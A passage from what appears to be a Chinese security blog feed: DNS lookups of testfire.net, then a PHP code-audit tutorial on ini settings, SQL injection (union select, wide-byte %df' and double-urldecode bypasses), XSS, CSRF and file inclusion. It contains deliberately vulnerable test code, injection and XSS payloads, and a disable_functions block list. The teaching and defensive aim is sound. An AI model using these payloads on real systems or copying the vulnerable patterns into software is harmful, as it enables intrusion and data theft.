<p>注意：查询的时候去掉www、ftp等前缀，<a href="http://www.abc.com" target="_blank" rel="noopener">www.abc.com</a> 是abc.com的一个子域名</p>
<hr>
<h4 id="nslookup与dig域名查询"><a href="#nslookup与dig域名查询" class="headerlink" title="nslookup与dig域名查询"></a>nslookup与dig域名查询</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@kali:~# nslookup</span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> <span class="built_in">set</span> <span class="built_in">type</span>=A  <span class="comment">#可以对其ip地址进行解析   set type=MX 可以查找邮件转发服务器</span></span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> testfire.net</span></span><br><span class="line">Server:         114.114.114.114</span><br><span class="line">Address:        114.114.114.114#53</span><br><span class="line"></span><br><span class="line">Non-authoritative answer:</span><br><span class="line">Name:   testfire.net</span><br><span class="line">Address: 65.61.137.117</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msf5 &gt; dig @ASIA3.AKAM.NET testfire.net  #使用方法--dig @DNS服务器 待查询的域名</span><br><span class="line">[*] exec: dig @ASIA3.AKAM.NET testfire.net</span><br><span class="line">; &lt;&lt;&gt;&gt; DiG 9.11.5-P4-5.1+b1-Debian &lt;&lt;&gt;&gt; @ASIA3.AKAM.NET testfire.net</span><br><span class="line">; (1 server found)</span><br><span class="line">;; global options: +cmd</span><br><span class="line">;; Got answer:</span><br><span class="line">;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 53989</span><br><span class="line">;; flags: qr aa rd; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1</span><br><span class="line">;; WARNING: recursion requested but not available</span><br><span class="line"></span><br><span class="line">;; OPT PSEUDOSECTION:</span><br><span class="line">; EDNS: version: 0, flags:; udp: 4096</span><br><span class="line">;; QUESTION SECTION:</span><br><span class="line">;testfire.net.                  IN      A</span><br><span class="line"></span><br><span class="line">;; ANSWER SECTION:</span><br><span class="line">testfire.net.           86400   IN      A       65.61.137.117</span><br><span class="line"></span><br><span class="line">;; Query time: 300 msec</span><br><span class="line">;; SERVER: 23.211.61.64#53(23.211.61.64)</span><br><span class="line">;; WHEN: 四 4月 23 22:19:09 CST 2020</span><br><span class="line">;; MSG SIZE  rcvd: 57</span><br></pre></td></tr></table></figure>





]]></content>
  </entry>
  <entry>
    <title>代码审计</title>
    <url>/2020/03/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
    <content><![CDATA[<h2 id="PHP核心配值解释"><a href="#PHP核心配值解释" class="headerlink" title="PHP核心配值解释"></a>PHP核心配值解释</h2><p>​                                                                       <strong>PHP_INI_* 模式的定义</strong></p>
<table>
<thead>
<tr>
<th>模式</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td><em>PHP_INI_USER</em></td>
<td>可在用户脚本（例如  ini_set() ）或 Windows 注册表（自 PHP 5.3 起）以及 .user.ini 中设定</td>
</tr>
<tr>
<td><em>PHP_INI_PERDIR</em></td>
<td>可在 php.ini，.htaccess 或 httpd.conf 中设定</td>
</tr>
<tr>
<td><em>PHP_INI_SYSTEM</em></td>
<td>可在 php.ini 或 httpd.conf 中设定</td>
</tr>
<tr>
<td><em>PHP_INI_ALL</em></td>
<td>可在任何地方设定</td>
</tr>
<tr>
<td><em>php_ini only</em></td>
<td>仅可在php.ini中配值</td>
</tr>
</tbody></table>
<h3 id="1-register-globals-全局变量注册开关"><a href="#1-register-globals-全局变量注册开关" class="headerlink" title="1.register_globals(全局变量注册开关)"></a><strong>1.register_globals(全局变量注册开关)</strong></h3><p>on——会直接把拥护GET、POST等方式提交上来的参数注册成全局变量，并初始化值为参数对应的值，使得题交参数可以直接在脚本中使用。</p>
<p>PHP5.4.0以下的版本可以正常使用</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>($user==<span class="string">'admin'</span>)&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'chj'</span>;&#125;</span><br><span class="line"><span class="meta">?&gt;</span>php</span><br></pre></td></tr></table></figure>

<img src="/2020/03/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/3.png" alt="3" style="zoom: 80%;">

<h3 id="2-allow-url-include-是否允许包含远程文件"><a href="#2-allow-url-include-是否允许包含远程文件" class="headerlink" title="2.allow_url_include(是否允许包含远程文件)"></a><strong>2.allow_url_include(是否允许包含远程文件)</strong></h3><p>on——可以直接包含远程文件   </p>
<p>测试代码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">include</span> $_GET[<span class="string">'a'</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<img src="/2020/03/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/1.png" style="zoom:80%;">

<h3 id="3-magic-quotes-gpc-魔术引号自动过滤"><a href="#3-magic-quotes-gpc-魔术引号自动过滤" class="headerlink" title="3.magic_quotes_gpc(魔术引号自动过滤)"></a><strong>3.magic_quotes_gpc(魔术引号自动过滤)</strong></h3><p>on——会自动在GET、POST、COOKIE变量中的 ‘  ‘’  \  以及空字符NULL 的前面加上反斜杠（\）</p>
<p>但是PHP5中的magic_quotes_gpc并<strong>不会过滤$_SERVER变量</strong>，导致很多<strong>类似client-ip,referer</strong>一类的漏洞能够利用。</p>
<p>PHP5.4版本之后<strong>取消了magic_quotes_gpc</strong></p>
<p>PHP版本小于4.2.3时，配值范围是PHP_INI_ALL</p>
<p>PHP版本大于4.2.3时，是PHP_INI_PERDIR</p>
<p>测试代码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> $_GET[<span class="string">'chj'</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/2.png" alt></p>
<h3 id="4-magic-quotes-runtime-魔术引号自动过滤"><a href="#4-magic-quotes-runtime-魔术引号自动过滤" class="headerlink" title="4.magic_quotes_runtime(魔术引号自动过滤)"></a><strong>4.magic_quotes_runtime(魔术引号自动过滤)</strong></h3><p>magic_quotes_runtime和magic_quotes_gpc功能一样，区别是处理的对象不一样</p>
<p>magic_quotes_runtime<strong>只对从数据库或者文件中获取的数据进行过滤</strong></p>
<p>由于很多人只对外部输入的数据进行过滤，所以有的攻击者可先将攻击代码写入数据库，在程序读取后即可触发攻击</p>
<p>同样<strong>在PHP5.4版本以后也取消了</strong></p>
<p>注意，只有部分函数受它影响，所以是可以绕过这个配值的。</p>
<p>受影响的包括get_meta_tags()、stream_socket_recvform()、exec()…等等</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#文件1.txt  1 '2"3\4</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">"magic_quotes_runtime"</span>,<span class="string">"1"</span>);</span><br><span class="line"><span class="keyword">echo</span> file_get_contents(<span class="string">"D:/phpstudy_pro/WWW/phpsafe/1.txt"</span>);<span class="comment">#把整个文件读入一个字符串中</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>输出如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span> \<span class="string">'2\"3\\4</span></span><br></pre></td></tr></table></figure>

<h3 id="5-magic-quotes-sybase-魔术引号自动过滤"><a href="#5-magic-quotes-sybase-魔术引号自动过滤" class="headerlink" title="5.magic_quotes_sybase(魔术引号自动过滤)"></a><strong>5.magic_quotes_sybase(魔术引号自动过滤)</strong></h3><p>magic_quotes_sybase指令用于自动过滤特殊字符，设置为on时，会覆盖gpc的配值</p>
<p>它和gpc的区别在于，仅仅转义了空字符和把单引号( ’ )变成了双引号( “ )</p>
<p>在PHP5.4.0中移除了</p>
<h3 id="6-safe-mode-安全模式"><a href="#6-safe-mode-安全模式" class="headerlink" title="6.safe_mode(安全模式)"></a><strong>6.safe_mode(安全模式)</strong></h3><p>安全模式是PHP内嵌的一种安全机制，当safe_mode=on时：</p>
<p>（1）所有文件操作函数都会收到限制</p>
<p>（2）通过函数popen()、system()以及exec()等函数执行命令或程序会提示错误</p>
<h3 id="7-open-basedir-PHP-可访问目录"><a href="#7-open-basedir-PHP-可访问目录" class="headerlink" title="7.open_basedir PHP 可访问目录"></a><strong>7.open_basedir PHP 可访问目录</strong></h3><p>open_basedi指令用来限制PHP只能访问哪些目录</p>
<p>例如配值open_basedi=/www/a，那么目录/www/a 和 /www/ab 都是可以访问的。</p>
<p>如果open_basedi=/www/a/，那么只能访问/www/a/</p>
<p>PHP版本小于5.2.3时，是PHP_INI_SYSTEM，</p>
<p>大于等于5.2.3是PHP_INI_ALL</p>
<h3 id="8-disable-functions-禁用函数"><a href="#8-disable-functions-禁用函数" class="headerlink" title="8.disable_functions(禁用函数)"></a><strong>8.disable_functions(禁用函数)</strong></h3><p>在正式的生产环境中，为了更安全的运行PHP，使用此指令来禁止一些敏感函数的使用</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">disable_functions=phpinfo,<span class="keyword">eval</span>,passthru,exec,system</span><br></pre></td></tr></table></figure>

<p>配值禁用函数的时候，按照以上格式分割函数名，配值范围是php.ini only</p>
<p>切记，也要把dl()函数加到禁用列表，因为攻击者可以利用dl()函数来加载自定义的PHP扩展以突破限制。</p>
<h3 id="9-display-errors和error-reporting-错误显示"><a href="#9-display-errors和error-reporting-错误显示" class="headerlink" title="9.display_errors和error_reporting 错误显示"></a><strong>9.display_errors和error_reporting 错误显示</strong></h3><p>display_errors 表示是否显示PHP脚本内部错误，在调试的时候通常打开，但是在生产环境中建议关闭。</p>
<p>error_reporting 是用来配值错误显示的级别。</p>
<hr>
<h2 id="通用代码审计思路"><a href="#通用代码审计思路" class="headerlink" title="通用代码审计思路"></a><strong>通用代码审计思路</strong></h2><h3 id="1-敏感函数回溯参数过程"><a href="#1-敏感函数回溯参数过程" class="headerlink" title="1.敏感函数回溯参数过程"></a><strong>1.敏感函数回溯参数过程</strong></h3><hr>
<h2 id="漏洞挖掘与防范（基础篇）"><a href="#漏洞挖掘与防范（基础篇）" class="headerlink" title="漏洞挖掘与防范（基础篇）"></a><strong>漏洞挖掘与防范（基础篇）</strong></h2><h3 id="1-SQL注入"><a href="#1-SQL注入" class="headerlink" title="1.SQL注入"></a><strong>1.SQL注入</strong></h3><p>本质：SQL注入是直接面对数据库进行攻击的</p>
<p>攻击方式：</p>
<p>一、在权限较大的情况下，可通过SQL注入直接写入webshell或者直接执行系统命令</p>
<p>二、在权限较小的情况下，可获得管理员密码等，或者修改数据库内容进行钓鱼等</p>
<p>常用工具：sqlmap</p>
<p>挖掘经验：sql注入经常出现在登录页面、获取HTTP头、订单处理等</p>
<p>登录页面的注入多数发生在HTTP头里面的client-ip和x-forward-for</p>
<p>1.1普通注入</p>
<p>测试代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$uid=$_GET[<span class="string">'id'</span>];</span><br><span class="line">$sql=<span class="string">"SELECT*FROM userinfo where id=$uid"</span>;</span><br><span class="line">$conn=mysqli_connect(<span class="string">'localhost'</span>,<span class="string">'root'</span>,<span class="string">'root'</span>);</span><br><span class="line">mysqli_select_db($conn,<span class="string">"test"</span>);</span><br><span class="line">$result=mysqli_query($conn,$sql);</span><br><span class="line">print_r(<span class="string">'当前SQL语句：'</span>.$sql.<span class="string">'&lt;br/&gt;结果：'</span>);</span><br><span class="line">print_r(mysqli_fetch_row($result));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>输出：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#4.1php?id=-1 union select 1,user(),3,4</span></span><br><span class="line">当前SQL语句：SELECT*FROM userinfo where id=<span class="number">-1</span> union select <span class="number">1</span>,user(),<span class="number">3</span>,<span class="number">4</span></span><br><span class="line">结果：<span class="keyword">Array</span> ( [<span class="number">0</span>] =&gt; <span class="number">1</span> [<span class="number">1</span>] =&gt; root@localhost [<span class="number">2</span>] =&gt; <span class="number">3</span> [<span class="number">3</span>] =&gt; <span class="number">4</span> )</span><br></pre></td></tr></table></figure>

<p>需要注意的是，7.x版本中已经舍弃了mysql_connect()，所以需要改为mysqli_connect()</p>
<table>
<thead>
<tr>
<th><strong>mysqli_fetch_row()</strong></th>
<th><strong>从结果集中取得一行，并作为枚举数组返回。</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong>mysqli_select_db()</strong></td>
<td><strong>用于更改连接的默认数据库</strong></td>
</tr>
<tr>
<td><strong>mysqli_query()</strong></td>
<td><strong>执行某个针对数据库的查询。</strong></td>
</tr>
<tr>
<td><strong>mysqli_connect()</strong></td>
<td><strong>打开一个到 MySQL 服务器的新的连接</strong></td>
</tr>
</tbody></table>
<p>从上述测试代码可以知道，数据库操作存在一些关键词如mysqli_query等，查询方式还有update、insert、delete等</p>
<p>在做白盒审计的时候，只需要查找这些关键字就可以定向挖掘SQL注入漏洞。</p>
<h3 id="2-编码注入-宽字节注入"><a href="#2-编码注入-宽字节注入" class="headerlink" title="2.编码注入-宽字节注入"></a><strong>2.编码注入-宽字节注入</strong></h3><p>程序在操作前会进行一些编码处理，通过输入转码函数不兼容的特殊字符，可以导致输出的字符变成有害数据</p>
<p>最常见的编码注入是MySQL宽字节以及urldecode/rawurldecode函数导致的</p>
<p><strong>mysql在使用GBK编码的时候，会认为两个字符是一个汉字（前一个ASCII码要大于128，才到汉字的范围）</strong></p>
<p>这是由于单引号被自动转义成 \‘  , 前面的<strong>%df和转义字符\ 反斜杠(%5c) 组合成了 %df%5c</strong> 。也就是運字</p>
<p>这时候单引号依然还在，于是成功闭合了前面的单引号</p>
<p>测试代码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$conn=mysqli_connect(<span class="string">'localhost'</span>,<span class="string">'root'</span>,<span class="string">'root'</span>)<span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'bad!'</span>);</span><br><span class="line">mysqli_select_db($conn,<span class="string">"test"</span>)<span class="keyword">OR</span> emMsg(<span class="string">"连接数据库失败，未找到您填写的数据库"</span>);</span><br><span class="line">mysqli_query($conn,<span class="string">"set names 'gbk'"</span>);</span><br><span class="line">$uid=addslashes($_GET[<span class="string">'id'</span>]);</span><br><span class="line">$sql=<span class="string">"SELECT*FROM userinfo where id='$uid'"</span>;</span><br><span class="line">$result=mysqli_query($conn,$sql);</span><br><span class="line"><span class="keyword">if</span> (!$result) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"wro"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">print_r(<span class="string">'当前SQL语句：'</span>.$sql.<span class="string">'&lt;br/&gt;结果：'</span>);</span><br><span class="line">print_r(mysqli_fetch_row($result));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?id=%df<span class="string">' union select 1,2,3,4#</span></span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">当前SQL语句：<span class="keyword">SELECT</span> <span class="keyword">id</span>,username <span class="keyword">FROM</span> userinfo <span class="keyword">where</span> <span class="keyword">id</span>=<span class="string">'�\'</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">database</span>(),<span class="keyword">user</span>()<span class="comment">#'</span></span><br><span class="line">结果：<span class="built_in">Array</span> ( [<span class="number">0</span>] =&gt; <span class="keyword">test</span> [<span class="number">1</span>] =&gt; root@localhost )</span><br></pre></td></tr></table></figure>

<h3 id="3-二次urldecode注入"><a href="#3-二次urldecode注入" class="headerlink" title="3.二次urldecode注入"></a><strong>3.二次urldecode注入</strong></h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a=addslashes($_GET[<span class="string">'p'</span>]);</span><br><span class="line">$b=urldecode($a);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'$a='</span>.$a;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;br /&gt;'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'$b='</span>.$b;</span><br></pre></td></tr></table></figure>

<p>输入：<strong>?p=1%2527</strong></p>
<p>输出：*<em>$a=1%27     *</em></p>
<p>​           <strong>$b=1’</strong></p>
<p>现在的Web程序通常用<strong>addslashes()、mysql_real_escape_string()、mysql_escape_string()函数</strong></p>
<p>或者开启GPC对<strong>单引号、双引号、\  和NULL 加  \   转义</strong></p>
<p>但如果使用<strong>了urldecode or  rawurldecode 函数</strong> 会导致二次解码生成单引号而引发注入</p>
<p>4.espcms 搜索注入分析</p>
<p>部分代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$key=urldecode(<span class="keyword">$this</span>-&gt;fun-&gt;accept(<span class="string">'key'</span>,<span class="string">'R'</span>));</span><br><span class="line">···</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($key))&#123;</span><br><span class="line">	$db_where.=<span class="string">"AND FIND_IN_SET('$key',tags)"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>由于$key变量使用了urldecode，从而可以绕过GPC</p>
<p>如果$key不为空，则拼接到SQL语句中，导致产生注入漏洞</p>
<h3 id="4-漏洞防范"><a href="#4-漏洞防范" class="headerlink" title="4.漏洞防范"></a><strong>4.漏洞防范</strong></h3><p>在PHP5.4版本之前可以用魔术引号解决</p>
<p>后面虽然被取消了，但可以用<strong>过滤函数和类</strong>来解决</p>
<p>如discuz、dedecms、phpcms等程序都使用了过滤类</p>
<p>但仍然存在绕过的问题，最好的解决方法是利用<strong>预编译的方式</strong></p>
<h4 id="4-1-gpc-rutime-魔术引号"><a href="#4-1-gpc-rutime-魔术引号" class="headerlink" title="4.1 gpc/rutime 魔术引号"></a><strong>4.1 gpc/rutime 魔术引号</strong></h4><p>通常数据污染有2种，一种是GET、POST等被动接收参数</p>
<p>还有一种是主动获取参数，如读取远程页面或者文件内容</p>
<p>所以防止SQL注入，就是要守住这2条路！</p>
<p>魔术引号对int型的注入是没多大作用的。</p>
<h4 id="4-2-过滤函数和类"><a href="#4-2-过滤函数和类" class="headerlink" title="4.2 过滤函数和类"></a><strong>4.2 过滤函数和类</strong></h4><p>过滤函数和类有2种使用场景，一种是程序入口统一过滤，像框架程序用的多</p>
<p>另一种是在程序进行SQL语句之前使用，除了PHP内置的一些过滤单引号等函数外</p>
<p>还有一些开源类过滤union、select等关键字</p>
<p><strong>1.addslashes</strong>函数</p>
<p>以下方法可以绕过该函数</p>
<table>
<thead>
<tr>
<th>$userid = urldecode($userid)</th>
<th>注入语句进行两次编码，首先通过addslashes()过滤，然后urlencode解码</th>
</tr>
</thead>
<tbody><tr>
<td><strong>$userid = rawurldecode($userid)</strong></td>
<td></td>
</tr>
<tr>
<td><strong>$userid = base64_decode($userid)</strong></td>
<td><strong>首先通过addslashes()过滤，然后urlencode解码</strong></td>
</tr>
<tr>
<td><strong>$userid = json_encode($userid)</strong></td>
<td><strong>该函数把\转换为\，两个反斜杠抵消。</strong></td>
</tr>
</tbody></table>
<p><strong>2.mysql_ (real_) escape_string 函数</strong></p>
<p>这2个函数都是对字符串进行过滤，在PHP4.0.3以上版本才存在</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">\x00 \n \r \ &#39; &quot; \xla    这些字符受到影响</span><br></pre></td></tr></table></figure>

<p>推荐使用mysql_real_escape_string() ，因为它接受的是一个连接句柄并根据当前字符集转义字符串</p>
<p>例如：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$sql=<span class="string">"select * from test where id=' "</span>.$id.<span class="string">" '  "</span>;</span><br></pre></td></tr></table></figure>

<p>当id=1’ 时，输出id=’ 1 \ ‘’</p>
<p><strong>3.intval 等字符转换</strong></p>
<p>代码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$id=intval(<span class="string">"1 union select"</span>);</span><br><span class="line"><span class="keyword">echo</span> $id;  <span class="comment">#输出为1</span></span><br></pre></td></tr></table></figure>

<p>intval 是将变量转换成int型,可以防止盲注等方式绕过。</p>
<h4 id="4-3-PDO-prepare-预编译"><a href="#4-3-PDO-prepare-预编译" class="headerlink" title="4.3 PDO prepare 预编译"></a><strong>4.3 PDO prepare 预编译</strong></h4><h3 id="5-XSS漏洞"><a href="#5-XSS漏洞" class="headerlink" title="5.XSS漏洞"></a><strong>5.XSS漏洞</strong></h3><p>在Web漏洞中，XSS是最多的！它可以通过外部输入然后直接在浏览器端触发，即<strong>反射型XSS</strong></p>
<p>还可以通过把代码保存在数据库或文件中，当Web程序读取利用代码并输出在页面时触发–<strong>存储型XSS</strong></p>
<p>危害：前端页面能做的事情，它都可以（如获取cookie，修改页面钓鱼等）</p>
<h4 id="5-1-挖掘经验"><a href="#5-1-挖掘经验" class="headerlink" title="5.1 挖掘经验"></a><strong>5.1 挖掘经验</strong></h4><p>挖掘XSS漏洞的关键在于寻找没有被过滤的参数，且这些参数传入到输出函数</p>
<p>常用的输出函数如下：<strong>var_dump、var_export、die、sprintf、print、print_r、echo、printf</strong></p>
<p>所以只需要寻作带有变量的这些函数即可</p>
<p>注意：<strong>浏览器环境十分影响XSS漏洞的利用</strong>，还需要掌握各种<strong>浏览器容错、编码等特性和数据协议</strong></p>
<p>XSS漏洞经常出现在<strong>文章发表、评论回复、留言以及资料设置</strong>等地方</p>
<p>因为这里有各种图片引用、文字格式设置等，经常出现<strong>对标签事件过滤不严格</strong>导致的XSS</p>
<p>还有就是用户昵称可能不止一处可以修改，不一定所有地方都严格过滤了，所以可以多关注这几个地方</p>
<h4 id="5-2-反射型XSS"><a href="#5-2-反射型XSS" class="headerlink" title="5.2 反射型XSS"></a><strong>5.2 反射型XSS</strong></h4><p>可通过扫描器黑盒直接发现</p>
<p>只需要将&lt;&gt;、‘ 、“ 等题交到Web服务器，检查返回的HTML页面是否保留原来的特殊字符就可以判断</p>
<p>在白盒审计中，只需要寻作带有参数的输出函数，然后根据输出函数对输出内容回溯输入参数，观察是否经过过滤</p>
<p>测试代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//以下是QQ私密接口</span></span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">"openid"</span>])&#123;</span><br><span class="line">    <span class="comment">//授权成功后，会返回用户的openid</span></span><br><span class="line">    <span class="comment">//检查返回的openid是否是合法id</span></span><br><span class="line">    <span class="keyword">if</span>(!is_valid_openid($_GET[<span class="string">"openid"</span>],$_GET[<span class="string">"timestamp"</span>],$_GET[<span class="string">"oauth_signature"</span>]))</span><br><span class="line">    &#123;</span><br><span class="line">        showerr(<span class="string">'API账号有误！'</span>);</span><br><span class="line">        <span class="comment">//demo对错误简单处理</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"##invalid openid\n"</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"sig:"</span>.$_GET[<span class="string">"oauth_signature"</span>].<span class="string">"\n"</span>;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>代码中echo “sig:”.$ _GET [“oauth_signature”].”\n”;   直接将  $ _ GET [“oauth_signature”] 的值输出到浏览器</p>
<p>所以可以直接利用GET方式注入代码</p>
<h4 id="5-3-存储型XSS分析"><a href="#5-3-存储型XSS分析" class="headerlink" title="5.3 存储型XSS分析"></a><strong>5.3 存储型XSS分析</strong></h4><p>代码如下：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;span styele=<span class="string">"color:##FF6600"</span> title=<span class="string">"&lt;img src=&#123;#$list.link_logo#&#125; border=0/&gt;"</span> </span><br><span class="line">class="vtio"&gt;[logo]&lt;/span&gt;</span><br></pre></td></tr></table></figure>

<p>这里代码直接把显示logo的img标签放在span标签的title里面</p>
<p>当鼠标滑过的时候，会调用事件执行显示title，即执行img标签</p>
<p>所以这里的利用点就是可以是HTML实体编码，从而绕过安全检查</p>
<p>在logo处输入 1 oner&114;or=ale &amp; #114;t(1)</p>
<h4 id="5-4-XSS漏洞防范"><a href="#5-4-XSS漏洞防范" class="headerlink" title="5.4 XSS漏洞防范"></a><strong>5.4 XSS漏洞防范</strong></h4><p>特殊字符HTML实体转码</p>
<p>标签事件属性黑白名单</p>
<h3 id="6-CSRF漏洞"><a href="#6-CSRF漏洞" class="headerlink" title="6.CSRF漏洞"></a><strong>6.CSRF漏洞</strong></h3><p>CSRF=Cross-site request forgery 跨站请求伪造</p>
<p>通俗来讲就是劫持其它用户去进行一些请求</p>
<p>简单的攻击流程讲解：</p>
<p>假设直接请求x.com/del.php?id=1 可以删除ID为1的账号，但是需要管理权限</p>
<p>如果在其它网站页面加入&lt; img src=” http: //x.com/del.php?id=1 “&gt;,让管理员打开，就达到目的了</p>
<p>更严重的像添加管理员账号、修改网站配值直接写入webshell等等</p>
<h4 id="6-1-挖掘经验"><a href="#6-1-挖掘经验" class="headerlink" title="6.1 挖掘经验"></a><strong>6.1 挖掘经验</strong></h4><p>CSRF主要是用于越权操作，所有漏洞自然在有权限控制的地方，像管理后台、会员中心</p>
<p>论坛帖子以及交意管理等，管理后台又是最高危的地方</p>
<p>挖掘CSRF的时候，可以先搭好环境，打开几个非静态操作的页面，抓包查看有没有token</p>
<p>如果没有token，直接请求这个页面，不带refer</p>
<p>如果返回的数据还是一样的话，那说明很有可能有CSRF漏洞了，这是一个黑盒的挖掘方法</p>
<p>从白盒的角度来说，只要读代码的时候看看几个核心文件里面有没有验证token和referer相关的代码，这里的核心文件是指被大量文件引用的基础文件，或者直接搜”token”这个关键词。</p>
<h4 id="6-2-漏洞防范"><a href="#6-2-漏洞防范" class="headerlink" title="6.2 漏洞防范"></a><strong>6.2 漏洞防范</strong></h4><p>防御CSRF漏洞的最主要问题是解决可信的问题，即使是管理员权限提交到服务器的数据也不一定是完全可信的</p>
<p>所以有2种方式：1）增加token/referer验证，避免img标签请求的水坑攻击 2）增加验证码</p>
<p><strong>1.Token验证</strong></p>
<p>token翻译为”标志”，在计算机认证领域叫令牌</p>
<p>简单理解为在页面或者cookie里加一个不可预测的字符串，服务器在接收操作请求的时候只要验证下这个字符串是不是上次访问留下的，即可判断。</p>
<p>因为如果没有访问上一个页面，是无法得到这个token的，除非结合XSS漏洞或者其它手段获得通信数据</p>
<p>Token实现测试代码如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">function set_token()&#123;</span><br><span class="line">	$_SESSION[&#39;token&#39;]&#x3D;md5(time()+rand(1,1000));</span><br><span class="line">&#125;</span><br><span class="line">function check_token()&#123;</span><br><span class="line">	if(isset($_POST[&#39;token&#39;])&amp;&amp;$_POST[&#39;token&#39;]&#x3D;&#x3D;&#x3D;$_SESSION[&#39;token&#39;])</span><br><span class="line">	&#123;</span><br><span class="line">		return true;</span><br><span class="line">	&#125;</span><br><span class="line">	else &#123; return false;&#125;</span><br><span class="line">&#125;</span><br><span class="line">if(isset($_SESSION[&#39;token&#39;])&amp;&amp;check_token())&#123;</span><br><span class="line">	echo &quot;success&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else &#123; echo &quot;failed&quot;;&#125;</span><br><span class="line">set_token();</span><br><span class="line">?&gt;</span><br><span class="line">&lt;form method&#x3D;&quot;post&quot;&gt;</span><br><span class="line">	&lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;token&quot; value&#x3D;&quot;&lt;?&#x3D;$_SESSION[&#39;token&#39;]?&gt;&quot;&gt;</span><br><span class="line">	&lt;input type&#x3D;&quot;submit&quot;&#x2F;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br></pre></td></tr></table></figure>



<hr>
<h2 id="漏洞挖掘与防范（进阶篇）"><a href="#漏洞挖掘与防范（进阶篇）" class="headerlink" title="漏洞挖掘与防范（进阶篇）"></a><strong>漏洞挖掘与防范（进阶篇）</strong></h2><h3 id="1-文件包含漏洞"><a href="#1-文件包含漏洞" class="headerlink" title="1.文件包含漏洞"></a><strong>1.文件包含漏洞</strong></h3><p>文件包含分为本地和远程包含，渗透过程中文件包含漏洞大多可以直接利用<strong>获取webshell</strong></p>
<p>文件包含函数有<strong>include()、include_once()、require()、require_once()</strong></p>
<p>它们之间的区别在于<strong>include()、include_once()</strong>在包含文件出错的时候，下面的代码依旧执行</p>
<p>而<strong>require()、require_once()</strong>会直接报错退出程序</p>
<h4 id="1-1挖掘经验"><a href="#1-1挖掘经验" class="headerlink" title="1.1挖掘经验"></a><strong>1.1挖掘经验</strong></h4><p>文件包含漏洞大多出现在模块加载、模板加载、以及cache调用的地方</p>
<h4 id="1-2-本地文件包含"><a href="#1-2-本地文件包含" class="headerlink" title="1.2 本地文件包含"></a><strong>1.2 本地文件包含</strong></h4><p>测试代码如下：</p>
